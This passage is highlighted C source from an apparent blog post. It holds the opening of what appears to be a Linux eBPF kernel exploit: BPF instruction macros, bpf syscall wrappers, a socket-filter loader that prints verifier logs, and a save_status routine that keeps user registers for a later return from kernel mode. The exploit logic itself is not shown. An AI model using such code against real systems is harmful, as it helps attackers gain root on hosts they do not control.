class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span 